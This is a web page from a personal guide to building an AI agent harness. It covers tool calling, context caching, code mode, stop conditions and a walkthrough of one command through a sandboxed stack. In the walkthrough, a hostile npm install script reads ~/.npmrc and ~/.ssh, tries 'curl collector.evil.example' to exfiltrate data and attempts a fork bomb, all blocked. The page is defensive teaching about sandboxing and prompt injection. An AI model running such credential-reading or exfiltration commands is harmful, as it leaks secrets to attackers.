@@ -1,0 +1,326 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>The Agent Harness</title>
+<meta name="description" content="The agent loop in depth: model tool-calling protocol, context management and caching, stop conditions, provider abstraction, and an end-to-end walkthrough of the full stack.">
+<style>
+:root{--bg:#fbfaf7;--surface:#fff;--surface-2:#f3f1ec;--text:#1d1c1a;--muted:#5f5c55;--line:#e2ded5;--accent:#b4532a;--accent-soft:#f6e6dc;--ok:#2f6b45;--ok-soft:#e1efe5;--warn:#8a5a00;--warn-soft:#f7edd6;--bad:#9c2f2f;--bad-soft:#f6e0e0;--code-bg:#f4f2ed;--code-text:#2a2824;--mono:ui-monospace,"SF Mono","JetBrains Mono",Menlo,Consolas,monospace;--sans:-apple-system,BlinkMacSystemFont,"Inter","Segoe UI",Roboto,sans-serif;--serif:"Iowan Old Style","Charter",Georgia,serif}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#161513;--surface:#1e1d1a;--surface-2:#262420;--text:#ebe8e1;--muted:#a6a197;--line:#36332d;--accent:#e8835a;--accent-soft:#3a2519;--ok:#7cc396;--ok-soft:#1c2e22;--warn:#e0b660;--warn-soft:#33290f;--bad:#e88b8b;--bad-soft:#3a1c1c;--code-bg:#1b1a17;--code-text:#e3dfd6}}
+:root[data-theme="dark"]{--bg:#161513;--surface:#1e1d1a;--surface-2:#262420;--text:#ebe8e1;--muted:#a6a197;--line:#36332d;--accent:#e8835a;--accent-soft:#3a2519;--ok:#7cc396;--ok-soft:#1c2e22;--warn:#e0b660;--warn-soft:#33290f;--bad:#e88b8b;--bad-soft:#3a1c1c;--code-bg:#1b1a17;--code-text:#e3dfd6}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:16px/1.65 var(--sans)}
+.topbar{position:sticky;top:0;z-index:5;background:var(--bg);border-bottom:1px solid var(--line)}
+.topbar .in{max-width:780px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;gap:12px}
+.topbar .home{font-family:var(--serif);font-weight:600;color:var(--text);text-decoration:none;white-space:nowrap}
+.topbar .sp{flex:1}
+.topbar details{position:relative}
+.topbar summary{cursor:pointer;list-style:none;font-size:13px;color:var(--muted);border:1px solid var(--line);border-radius:8px;padding:5px 10px;background:var(--surface)}
+.topbar summary::-webkit-details-marker{display:none}
+.topbar .menu{position:absolute;right:0;top:36px;background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:8px;min-width:240px;box-shadow:0 8px 24px rgba(0,0,0,.12)}
+.topbar .menu a{display:block;padding:6px 10px;border-radius:6px;color:var(--text);text-decoration:none;font-size:14px}
+.topbar .menu a:hover{background:var(--surface-2)}
+.topbar .menu a.cur{color:var(--accent);font-weight:600}
+.topbar .menu .n{display:inline-block;width:26px;color:var(--muted);font-family:var(--mono);font-size:12px}
+.themebtn{background:var(--surface);border:1px solid var(--line);color:var(--muted);border-radius:8px;padding:5px 10px;font-size:13px;cursor:pointer}
+main{max-width:780px;margin:0 auto;padding:40px 20px 100px}
+.kicker{font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);font-weight:600}
+h1{font-family:var(--serif);font-size:42px;line-height:1.12;margin:10px 0 12px;font-weight:600;letter-spacing:-.01em}
+h2{font-family:var(--serif);font-size:28px;line-height:1.2;margin:60px 0 6px;font-weight:600;scroll-margin-top:70px}
+h3{font-size:18px;margin:30px 0 6px;scroll-margin-top:70px}
+h4{font-size:13px;margin:20px 0 4px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+p{margin:10px 0 14px}
+.lede{font-size:19px;color:var(--muted)}
+a{color:var(--accent)}
+code{font-family:var(--mono);font-size:.88em;background:var(--code-bg);padding:1px 5px;border-radius:4px;overflow-wrap:anywhere}
+pre{background:var(--code-bg);color:var(--code-text);border:1px solid var(--line);border-radius:10px;padding:16px 18px;overflow-x:auto;font:13px/1.55 var(--mono);margin:14px 0 18px}
+pre code{background:none;padding:0;font-size:inherit;overflow-wrap:normal}
+pre .c{color:var(--muted);font-style:italic}
+pre .k{color:var(--accent)}
+pre b{color:var(--accent);font-weight:600}
+.cap{font-size:12px;color:var(--muted);font-family:var(--mono);margin:16px 0 -8px}
+table{width:100%;border-collapse:collapse;font-size:14.5px;margin:14px 0 20px}
+th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:12px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted);font-weight:600}
+.tw{overflow-x:auto}
+.callout{border-radius:10px;padding:14px 18px;margin:18px 0;border:1px solid var(--line);background:var(--surface)}
+.callout b.t{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;margin-bottom:4px}
+.callout.why{background:var(--accent-soft);border-color:transparent}.callout.why b.t{color:var(--accent)}
+.callout.gotcha{background:var(--warn-soft);border-color:transparent}.callout.gotcha b.t{color:var(--warn)}
+.callout.ok{background:var(--ok-soft);border-color:transparent}.callout.ok b.t{color:var(--ok)}
+.callout.bad{background:var(--bad-soft);border-color:transparent}.callout.bad b.t{color:var(--bad)}
+.callout p:first-of-type{margin-top:0}.callout p:last-child,.callout ul:last-child,.callout ol:last-child{margin-bottom:0}
+.oneminute{border-left:3px solid var(--accent);background:var(--surface);border-radius:0 10px 10px 0;padding:14px 18px;margin:22px 0}
+.oneminute b.t{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;color:var(--accent);margin-bottom:4px}
+.oneminute p:last-child{margin-bottom:0}.oneminute p:first-of-type{margin-top:0}
+ol.steps{list-style:none;counter-reset:st;padding:0;margin:16px 0 20px}
+ol.steps>li{counter-increment:st;position:relative;padding:2px 0 12px 42px;border-left:2px solid var(--line);margin-left:13px}
+ol.steps>li:last-child{border-left-color:transparent}
+ol.steps>li::before{content:counter(st);position:absolute;left:-14px;top:0;width:26px;height:26px;border-radius:50%;background:var(--accent);color:#fff;font:600 13px/26px var(--sans);text-align:center}
+ol.steps pre{margin:8px 0 4px}
+.flow{display:flex;flex-wrap:wrap;align-items:center;gap:8px;margin:18px 0;font-size:13.5px}
+.flow .b{background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:7px 11px;font-family:var(--mono);font-size:12.5px}
+.flow .b.hl{border-color:var(--accent);color:var(--accent)}
+.flow .ar{color:var(--muted)}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card h4{margin:0 0 4px;color:var(--text);text-transform:none;letter-spacing:0;font-size:15px}
+.card p{margin:0;font-size:14.5px;color:var(--muted)}
+a.card{text-decoration:none;color:inherit;display:block}
+a.card:hover{border-color:var(--accent)}
+.spec{border:1px solid var(--line);border-radius:10px;background:var(--surface);padding:4px 18px 10px;margin:18px 0}
+.spec>b{display:block;font-size:12px;text-transform:uppercase;letter-spacing:.07em;color:var(--muted);margin:12px 0 2px}
+.spec ul{margin:6px 0 10px;padding-left:20px}
+ul.tight li,ol.tight li{margin:3px 0}
+.check{margin:28px 0 0}
+details.q{border:1px solid var(--line);border-radius:10px;background:var(--surface);padding:10px 16px;margin:10px 0}
+details.q summary{cursor:pointer;font-weight:600}
+details.q[open] summary{margin-bottom:6px}
+details.q p:last-child{margin-bottom:4px}
+.nextprev{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:70px;padding-top:24px;border-top:1px solid var(--line)}
+.nextprev a{display:block;border:1px solid var(--line);border-radius:10px;padding:12px 16px;text-decoration:none;color:var(--text);background:var(--surface)}
+.nextprev a:hover{border-color:var(--accent)}
+.nextprev small{display:block;color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.06em}
+.nextprev .nx{text-align:right;grid-column:2}
+.pill{display:inline-block;font-size:11.5px;font-weight:600;padding:2px 8px;border-radius:999px;background:var(--surface-2);color:var(--muted);margin-right:4px}
+.stack{margin:22px 0;display:flex;flex-direction:column;gap:6px}
+.layer{display:grid;grid-template-columns:160px 1fr 120px;gap:14px;align-items:center;background:var(--surface);border:1px solid var(--line);border-radius:8px;padding:10px 14px;font-size:14.5px;text-decoration:none;color:var(--text)}
+.layer:hover{border-color:var(--accent)}
+.layer .n{font-weight:600}.layer .d{color:var(--muted)}.layer .c{font-family:var(--mono);font-size:12px;color:var(--accent);text-align:right}
+footer{margin-top:40px;color:var(--muted);font-size:13px}
+@media (max-width:680px){h1{font-size:32px}h2{font-size:24px}.grid2{grid-template-columns:1fr}.layer{grid-template-columns:1fr;gap:2px}.layer .c{text-align:left}.nextprev{grid-template-columns:1fr}.nextprev .nx{grid-column:1}.topbar .home span{display:none}}
+</style>
+</head>
+<body>
+<div class="topbar"><div class="in">
+<a class="home" href="index.html">◆ <span>Agent stack guide</span></a>
+<div class="sp"></div>
+<details><summary>Contents ▾</summary><div class="menu">
+<a href="index.html"><span class="n">·</span>Start here</a>
+<a href="01-processes.html"><span class="n">01</span>Processes &amp; syscalls</a>
+<a href="02-mcp.html"><span class="n">02</span>Tools over MCP</a>
+<a href="03-isolation.html"><span class="n">03</span>Isolation</a>
+<a href="04-network.html"><span class="n">04</span>Network &amp; egress</a>
+<a href="05-identity.html"><span class="n">05</span>Identity &amp; secrets</a>
+<a href="06-policy.html"><span class="n">06</span>Policy &amp; injection</a>
+<a href="07-tracing.html"><span class="n">07</span>Tracing</a>
+<a href="08-control-plane.html"><span class="n">08</span>Run control plane</a>
+<a href="09-harness.html" class=cur><span class="n">09</span>The harness</a>
+<a href="10-build-plan.html"><span class="n">10</span>Build plan</a>
+</div></details>
+<button class="themebtn" onclick="toggleTheme()" aria-label="Toggle light or dark theme">Theme</button>
+</div></div>
+<main>
+<div class="kicker">Part 9 · Component: loop</div>
+<h1>The harness</h1>
+<p class="lede">The loop that ties everything together: how tool calling works at the model API, how context is managed, code mode, when to stop, and one command followed through every layer of the stack.</p>
+<div class="oneminute"><b class="t">In one minute</b>
+<p>If you've written a minimal agent (the post <a href="https://jradhima.github.io/creating-a-minimal-agent.html">Creating a minimal agent</a> builds one in Python), you know this loop: send the conversation to the model, run the tools it asks for, send the results back, repeat until it stops asking. In this stack the harness has a different job: it's the <b>integration point</b> where policy, MCP, the sandbox, tracing and the control plane meet. It should stay small and boring. The interesting parts are the details of the tool-calling protocol, managing a context that grows every step, and knowing when to stop.</p></div>
+
+<h2 id="protocol">Tool calling at the model API, step by step</h2>
+<p>Field names differ between providers (some call them "tool use", others "function calls"), but the shape is the same everywhere:</p>
+<ol class="steps">
+  <li><b>The harness sends</b> a system prompt, the conversation so far, and the list of tools (name, description, JSON Schema), converted from MCP as described on the <a href="02-mcp.html#mapping">MCP page</a>.</li>
+  <li><b>The model answers</b> with a list of content blocks and a reason for stopping. When it wants tools, the reason is "tool use" and the blocks include one or more tool calls, each with its own ID:
+<pre><code>{"stop_reason":"tool_use", "content":[
+   {"type":"text", "text":"Let me run the tests first."},
+   {"type":"tool_use", "id":"call_7", "name":"run_command", "input":{"command":"go test ./..."}},
+   {"type":"tool_use", "id":"call_8", "name":"read_file",   "input":{"path":"parser.go"}}]}</code></pre></li>
+  <li><b>The harness appends the model's message to the history</b>, exactly as received.</li>
+  <li><b>For each tool call:</b> check policy, run it (through MCP), record a span. Independent calls like these two can run in parallel.</li>
+  <li><b>The harness appends one message with all the results</b>, each referring to its call ID, with the error flag when the tool failed:
+<pre><code>{"role":"user", "content":[
+   {"type":"tool_result", "tool_use_id":"call_7", "is_error":true, "content":"exit=1\n--- FAIL: TestParse …"},
+   {"type":"tool_result", "tool_use_id":"call_8", "content":"package parser\n…"}]}</code></pre></li>
+  <li><b>Back to step 1</b> with the longer history. When the model's stop reason is "end of turn" (no tool calls), the run's answer is its final text.</li>
+</ol>
+<div class="callout gotcha"><b class="t">Details that trip people up</b>
+<ul class="tight">
+<li><b>Every tool call needs a result</b> with the matching ID, even when policy denied it: send a result saying "denied by policy: reason". Missing results make most APIs reject the next request.</li>
+<li><b>Keep the model's message unchanged</b> in the history. Editing or reordering past messages breaks caching (below) and can confuse the model.</li>
+<li><b>The model never executes anything.</b> A tool call is a request; nothing happens until your harness decides it does. That's the whole basis for policy.</li>
+</ul></div>
+
+<h2 id="context">The context grows every step</h2>
+<p>Model APIs are <b>stateless</b>: they remember nothing between requests. So every step resends the entire conversation, and the conversation grows with every tool result. Cost grows faster than the number of steps:</p>
+<div class="tw"><table>
+<tr><th>Step</th><th>New content this step</th><th>Tokens sent this request</th><th>Tokens sent so far</th></tr>
+<tr><td>1</td><td>System prompt + tools + task: 3,000</td><td>3,000</td><td>3,000</td></tr>
+<tr><td>2</td><td>+ test output: 2,000</td><td>5,000</td><td>8,000</td></tr>
+<tr><td>3</td><td>+ a file: 4,000</td><td>9,000</td><td>17,000</td></tr>
+<tr><td>10</td><td>…</td><td>~30,000</td><td>~170,000</td></tr>
+</table></div>
+<p>A 5 MB log returned once is then resent on every later step. So context management isn't an optimization; it decides whether long runs are affordable at all. The tools, from cheapest to most drastic:</p>
+<ol class="steps">
+  <li><b>Truncate at the source.</b> Tools return bounded output with a note when truncated (<a href="02-mcp.html#design">tool design</a>). This alone prevents most blow-ups.</li>
+  <li><b>Use prompt caching.</b> Providers can cache the processed form of a request's beginning, making repeated prefixes much cheaper and faster. To benefit, keep the start of every request identical: system prompt and tool definitions first, history appended in order, nothing earlier ever modified.</li>
+  <li><b>Shrink old tool results.</b> Twenty steps later, the full output of an early <code>ls</code> is rarely needed. Replacing old results with a short stub ("[output of step 3 removed; 4,000 tokens]") keeps the history coherent. It does break caching from that point, so do it in occasional batches rather than every step.</li>
+  <li><b>Compact.</b> Near the context limit, ask the model to summarize the work so far, and continue from the summary. Effective, but details are lost, sometimes important ones.</li>
+  <li><b>Give the agent a notebook.</b> Let it write notes and plans to a file in its workspace and read them back when needed. Memory outside the context window costs nothing until it's used.</li>
+</ol>
+
+<h2 id="codemode">Code mode: letting the model write the glue</h2>
+<p>Everything so far assumes the standard pattern: each tool call is one round trip through the model. The model asks for a tool, the harness runs it, the whole result goes back into the context, the model reads it and asks for the next tool. <b>Code mode</b> changes that. The harness presents the tools as <b>functions in a programming language</b> and gives the model essentially one tool: "run this code". The model writes a short program that calls the functions, loops, filters and combines results; the harness runs the program in a sandbox; and only what the program prints goes back to the model.</p>
+<p>The tool servers don't change at all. Code mode is entirely a harness feature: the program's function calls still turn into ordinary MCP <code>tools/call</code> requests underneath.</p>
+
+<h3>The costs it removes</h3>
+<ul>
+  <li><b>Tool definitions in the context.</b> Every tool's description and schema is sent with every request. With a few servers that's a few thousand tokens; with hundreds of tools it can be tens of thousands before the task even starts.</li>
+  <li><b>Intermediate results through the context.</b> If one tool returns 200 records and the next tool needs three of them, all 200 pass through the model, and the model then has to copy the three into the next call by hand, which costs tokens and invites copying errors.</li>
+  <li><b>One model round trip per step.</b> A chain of six dependent calls is six model requests, each resending the growing history (<a href="#context">the context table above</a>).</li>
+  <li><b>An unnatural format.</b> Models have seen vast amounts of real code during training and comparatively few examples of tool-call JSON. Writing <code>for</code> loops and <code>filter</code> calls plays to their strengths.</li>
+</ul>
+
+<h3>One task, both ways</h3>
+<p>The task: <em>"Find the five most frequent errors in the checkout service over the last day, and open a ticket for the worst one."</em></p>
+<p><b>With direct tool calls:</b></p>
+<ol class="steps">
+  <li>The model calls <code>list_issues(project="checkout", since="24h")</code>. 200 issues come back, around 40,000 tokens, all into the context.</li>
+  <li>The model reads them, picks the top five, and calls <code>get_issue</code> five times. Five more results enter the context.</li>
+  <li>The model calls <code>create_ticket</code>, copying the title and part of a stack trace into the arguments.</li>
+  <li>The model writes its answer. That's four model requests, the later ones each carrying all the earlier data.</li>
+</ol>
+<p><b>With code mode:</b></p>
+<ol class="steps">
+  <li>The model writes one program and calls <code>execute_code</code> with it:
+<pre><code>const issues = await errors.listIssues({ project: "checkout", since: "24h" });
+const top = issues.sort((a, b) =&gt; b.count - a.count).slice(0, 5);
+const worst = await errors.getIssue({ id: top[0].id });
+const ticket = await tracker.createTicket({
+  title: `Fix: ${worst.title}`,
+  body: worst.stacktrace.slice(0, 2000),
+});
+console.log({ top: top.map(i =&gt; [i.title, i.count]), ticket: ticket.url });</code></pre></li>
+  <li>The harness runs it in a sandbox. The 200 issues and the stack trace stay inside the program.</li>
+  <li>Only the printed summary, a few hundred tokens, returns to the model, which writes its answer. That's two model requests.</li>
+</ol>
+
+<h3>How it works, step by step</h3>
+<ol class="steps">
+  <li><b>Generate an API from the tool schemas.</b> Each MCP tool's JSON Schema becomes a typed function signature:
+<pre><code><span class="c">// from: {"name":"list_issues","inputSchema":{"type":"object","properties":
+//   {"project":{"type":"string"},"since":{"type":"string"}},"required":["project"]}}</span>
+interface ListIssuesInput { project: string; since?: string }
+declare function listIssues(input: ListIssuesInput): Promise&lt;Issue[]&gt;;</code></pre>
+  The return type only exists if the tool declares one. MCP lets tools publish an <b>output schema</b> and return structured results; tools that only return free text give the model nothing to program against except "a string". Code mode rewards servers that describe their outputs.</li>
+  <li><b>Show the model the API.</b> With a handful of tools, put all the signatures in the prompt. With many, lay them out as files the model can browse (<code>servers/errors/listIssues.ts</code>) or give it a search tool, and let it read only what the task needs. This is called <b>progressive disclosure</b>, and it's what removes the "definitions in the context" cost.</li>
+  <li><b>Give the model one tool</b>, <code>execute_code(code)</code>, plus the browse or search tool if needed.</li>
+  <li><b>Run the program in a sandbox.</b> The functions inside are <b>stubs</b>: they have no network and no credentials. Calling one just sends a message out of the sandbox to the harness, for example a JSON line on stdout, the same idea as MCP's stdio transport.</li>
+  <li><b>The harness handles each stub call</b> as a normal tool call: <a href="06-policy.html#pdp">policy</a> check, <a href="07-tracing.html">trace span</a>, then the real <code>tools/call</code> to the MCP server, using credentials the harness holds. The result goes back into the sandbox as the function's return value.</li>
+  <li><b>The program's printed output</b>, size-limited like any tool output, becomes the result of <code>execute_code</code> and goes to the model.</li>
+</ol>
+<pre><code>model ──execute_code(script)──▶ harness ──▶ sandbox: script runs
+                                  ▲                │ errors.listIssues(…)   (stub: no network, no keys)
+                                  │◀───── call ────┘
+             policy ◀─┤ check
+              trace ◀─┤ span
+                      └──▶ MCP server tools/call (harness holds the credential)
+                                  │───── result ───▶ sandbox: script continues …
+model ◀──── printed summary ─────┘</code></pre>
+
+<h3>What it changes in the rest of the stack</h3>
+<ul>
+  <li><b>A sandbox becomes mandatory.</b> You're running code a model wrote, possibly after reading untrusted content. Options range from language-level sandboxes (a JavaScript isolate, or a runtime like Deno that has no file or network access unless granted) to <a href="03-isolation.html"><code>box</code></a>.</li>
+  <li><b>Stubs are the gate idea applied to tools.</b> The program gets <em>capabilities</em> (functions it can call) rather than <em>keys</em>. It can use the error tracker without ever seeing its token, exactly like <a href="05-identity.html#inject">credential injection</a>.</li>
+  <li><b>Policy still works per call</b>, at the stub boundary. Two things get harder: an "ask" now pauses a running program halfway through, and a denial arrives as an error the script may not handle. Calls that already succeeded aren't rolled back.</li>
+  <li><b>Exposure to injection shrinks, but isn't gone.</b> Untrusted data the script processes never enters the model's context, so it can't steer the model. But inside the script, data from an untrusted source can still flow into an outbound call, and a session-level policy can't see that. Tracking where each <em>value</em> came from is exactly what <a href="06-policy.html#frontier">CaMeL</a> adds: it's essentially code mode plus provenance tracking.</li>
+  <li><b>Tracing:</b> record the script itself on the <code>execute_code</code> span, with one child span per stub call, so a human can still see each individual action.</li>
+  <li><b>Privacy:</b> because intermediate data stays in the sandbox, the harness can replace sensitive values (email addresses, names) with placeholders before printed output reaches the model, and swap them back when they're passed to another tool.</li>
+</ul>
+
+<h3>Code mode and CLIs are the same idea</h3>
+<p>An agent with a shell and a vendor's CLI is already doing code mode, with bash as the language and the CLI as the API: <code>vendor issues list --json | jq '…' | head -5</code> filters 200 results down to five without them entering the context. That's why developer-tool vendors ship CLIs for agents, and why the "CLI or MCP?" debate exists at all.</p>
+<p>The difference is <b>where the credential and the network access live</b>. A CLI needs its own login and network access wherever it runs, so in a sandbox it needs the login mounted (bad) or its traffic sent through the gate with injection (good). Code mode with stubs keeps both in the harness by design. The trade-off in the other direction: a CLI is documented, versioned and familiar to the model from training, while a generated API is new to it on every run.</p>
+
+<h3>When to use which</h3>
+<div class="tw"><table>
+<tr><th>Prefer direct tool calls</th><th>Prefer code mode</th></tr>
+<tr><td>One or two calls</td><td>Many dependent calls</td></tr>
+<tr><td>Actions with side effects a human should approve one by one</td><td>Mostly reading, filtering, aggregating</td></tr>
+<tr><td>Small results</td><td>Large intermediate data</td></tr>
+<tr><td>No sandbox available</td><td>A sandbox you trust</td></tr>
+</table></div>
+<p>The cost is real: a sandbox to operate, scripts that fail halfway, and individual actions that are less visible to the user unless tracing makes them so. Code mode is a strong option for data-heavy work, not a replacement for tool calls everywhere.</p>
+
+<h2 id="stop">When to stop</h2>
+<ul class="tight">
+  <li><b>Done:</b> the model ended its turn without tool calls.</li>
+  <li><b>Budget:</b> steps, tokens or cost exceeded (<a href="08-control-plane.html#budgets">budgets</a>); the control plane's wall clock is the backstop.</li>
+  <li><b>Cancelled:</b> the run's context was cancelled by the control plane.</li>
+  <li><b>Stuck:</b> the same tool call with the same arguments three times in a row, or a long streak of errors. Stop and report, rather than burning budget. Some harnesses call this "doom loop" detection.</li>
+  <li><b>Unrecoverable error:</b> the model API keeps failing after retries.</li>
+</ul>
+
+<h2 id="errors">Errors, two kinds again</h2>
+<p><b>Model API errors</b> (rate limits, overloaded servers, network hiccups) are retried by the harness with exponential backoff and a little randomness ("jitter"), so many runs don't retry at the same instant. The model never sees them. <b>Tool errors</b> go to the model as results with the error flag, so it can adapt. Mixing these up is the same mistake as on the <a href="02-mcp.html#session">MCP page</a>, one layer up.</p>
+
+<h2 id="provider">One provider behind an interface</h2>
+<p>Keep the rest of the harness unaware of which model API it's talking to:</p>
+<pre><code>type Model interface {
+    Chat(ctx context.Context, req ChatRequest) (ChatResponse, error)
+}
+<span class="c">// ChatRequest/ChatResponse use your own neutral types: messages, content blocks,
+// tool definitions, tool calls, usage. One adapter per provider converts.</span></code></pre>
+<p>Start with one provider. Adding a second later is the real test of whether your neutral types are right; if the second adapter needs changes all over the harness, the interface leaked.</p>
+<p><b>Streaming</b> responses arrive as a sequence of small events (often over SSE). Text can be shown as it arrives, but a tool call's arguments arrive as JSON fragments, so the harness accumulates them and only acts once the call is complete.</p>
+
+<h2 id="prompt">The system prompt and repository context</h2>
+<p>The system prompt tells the model what it is, what tools it has, where it's working and what "done" means. Many projects also keep agent instructions in the repository (a file like <code>AGENTS.md</code> with commands and conventions), and harnesses load it automatically.</p>
+<div class="callout gotcha"><b class="t">Repository instructions are input, not configuration</b>
+<p>If the repository isn't yours, its instruction file was written by someone you don't control, and loading it into the prompt is exactly the injection scenario on the <a href="06-policy.html#injection">policy page</a>. Treat it like any other file from that repo: useful, and untrusted. The harness should tell policy it was loaded, so the session is marked accordingly.</p></div>
+
+<h2 id="modes">Headless and interactive</h2>
+<p>Run by the control plane, the harness is <b>headless</b>: configuration comes in at start, events go out to the control plane, approvals come back from it. Run by you in a terminal, it's <b>interactive</b>: events are printed, approvals are a prompt. The core loop is identical; only the "where do events go, where do approvals come from" part changes. Build headless first, since the control plane needs it, and keep the interactive mode as a thin layer on top.</p>
+
+<h2 id="walkthrough">One command through every layer</h2>
+<p>Here's everything in this guide working together. A cloud run is asked to fix a failing test in a repository you don't fully trust. Along the way, the model decides to run <code>npm install &amp;&amp; npm test</code>.</p>
+<ol class="steps">
+  <li><b>Control plane prepares.</b> <code>runs</code> creates run_42: workspace restored from an overlay snapshot, gate profile <code>node-dev</code> with its own socket, a GitHub token minted for this one repo, 15-minute budget. <a href="08-control-plane.html#lifecycle">↗</a></li>
+  <li><b>Harness starts.</b> It loads the repo's agent instructions (untrusted, so the session is tainted from the start), connects to <code>mcpbox</code> over stdio and converts its tools for the model. <a href="09-harness.html#prompt">↗</a></li>
+  <li><b>The model asks for <code>run_command</code>.</b> Policy allows it: sandboxed, no credentials. A span opens. <a href="06-policy.html#structured">↗</a></li>
+  <li><b>mcpbox receives <code>tools/call</code></b> with a <code>traceparent</code> in <code>_meta</code>, and hands the command to <code>box</code>. <a href="02-mcp.html#session">↗</a> <a href="07-tracing.html#propagation">↗</a></li>
+  <li><b>box builds the sandbox:</b> new namespaces, private root with only <code>/work</code> writable, 1 GB memory, 256 processes, network only through the gate socket, seccomp last, clean environment. <a href="03-isolation.html#order">↗</a></li>
+  <li><b>A dependency's install script misbehaves.</b> It reads <code>~/.npmrc</code> and <code>~/.ssh</code>: they don't exist in this filesystem. It runs <code>env</code>: no secrets there. It tries <code>curl collector.evil.example</code>: the gate refuses before even resolving the name, and logs it. It tries a fork bomb: <code>pids.max</code> stops it. <a href="04-network.html#dns">↗</a></li>
+  <li><b>The tests run and fail.</b> The result returns with the error flag; the model reads it, edits a file, and runs the tests again. They pass. <a href="09-harness.html#protocol">↗</a></li>
+  <li><b>The model calls <code>git_push</code>.</b> Policy: tainted session plus outbound write means <b>ask</b>. The run pauses; an approval event streams to your phone with the branch and the diff; you approve. <a href="06-policy.html#ask">↗</a></li>
+  <li><b>The push goes through the gate,</b> which decrypts it, sees it's for GitHub, and injects this run's token. The agent never saw it. <a href="05-identity.html#inject">↗</a></li>
+  <li><b>The run ends.</b> The control plane kills anything left in the cgroup, revokes the token, removes the gate profile and the overlay's upper directory, and keeps the trace: one connected tree, 14 spans, $0.04, one refused connection and one approval worth a glance. <a href="08-control-plane.html#cleanup">↗</a></li>
+</ol>
+<div class="callout ok"><b class="t">Notice</b><p>Nothing in that story depended on the model behaving well. That's the point of the whole stack.</p></div>
+
+<h2 id="build">What you'll build: loop</h2>
+<div class="spec">
+  <ul class="tight">
+    <li>The loop with the exact tool-calling protocol above, including results for denied calls.</li>
+    <li>An MCP client (it uses <code>mcpbox</code> or any other MCP server), policy check before every call, spans for every step.</li>
+    <li>One model provider behind the <code>Model</code> interface; retries with backoff and jitter.</li>
+    <li>Context management: truncation at the source, a stable prefix for caching, then old-result stubs.</li>
+    <li>Stop conditions including stuck detection; headless mode first, interactive later.</li>
+    <li>Out of scope: plugins, multiple agents, memory services, a web UI.</li>
+  </ul>
+  <b>Done means</b>
+  <ul class="tight">
+    <li>A set of small tasks (fix a failing test, add a function with a test, find a value in a file) runs headless under the control plane, with trajectory assertions from the <a href="07-tracing.html#evals">tracing page</a> passing.</li>
+  </ul>
+</div>
+
+<div class="check"><h2 id="check">Check yourself</h2>
+<details class="q"><summary>Policy denies a tool call. What does the harness send back to the model?</summary><p>A tool result with the matching call ID and the error flag, saying it was denied and why. Every tool call must get a result, or the next API request is rejected.</p></details>
+<details class="q"><summary>Why does a large tool output early in a run cost money on every later step?</summary><p>Because the API is stateless: the whole conversation, including that output, is resent with every request.</p></details>
+<details class="q"><summary>What breaks prompt caching?</summary><p>Changing anything near the start of the request: the system prompt, the tool definitions, or earlier messages. Caching works on an identical prefix, so history should only ever be appended to.</p></details>
+<details class="q"><summary>In code mode, why doesn't the sandboxed script need the error tracker's API token?</summary><p>Because its functions are stubs. Each call is sent out of the sandbox to the harness, which makes the real MCP call with the credential it holds and passes the result back. The script gets the capability, not the key.</p></details>
+<details class="q"><summary>Is code mode a property of the MCP server or of the harness?</summary><p>The harness. The server exposes ordinary tools; the harness decides whether to present them as tool definitions or as a generated API inside a sandbox. That's why code mode works with local and remote servers alike.</p></details>
+<details class="q"><summary>The repository contains an <code>AGENTS.md</code> file. Trusted or untrusted?</summary><p>It depends on who controls the repository. For a repository you don't control, untrusted: anyone who could commit could have written instructions in it.</p></details>
+</div>
+
+<nav class="nextprev"><a class="pv" href="08-control-plane.html"><small>← Previous</small>Run control plane</a><a class="nx" href="10-build-plan.html"><small>Next →</small>Build plan</a></nav>
+<footer>Agent stack guide · a personal learning project, November 2026. · <a href="../../index.html">yannis radhima</a></footer>
+</main>
+<script>
+function toggleTheme(){var r=document.documentElement;var d=r.getAttribute('data-theme')?r.getAttribute('data-theme')==='dark':window.matchMedia('(prefers-color-scheme: dark)').matches;r.setAttribute('data-theme',d?'light':'dark');try{localStorage.setItem('theme',r.getAttribute('data-theme'))}catch(e){}}
+try{var t=localStorage.getItem('theme');if(t)document.documentElement.setAttribute('data-theme',t)}catch(e){}
+document.addEventListener('click',function(e){var d=document.querySelector('.topbar details');if(d&&d.open&&!d.contains(e.target))d.open=false});
+</script>
+</body>
+</html>
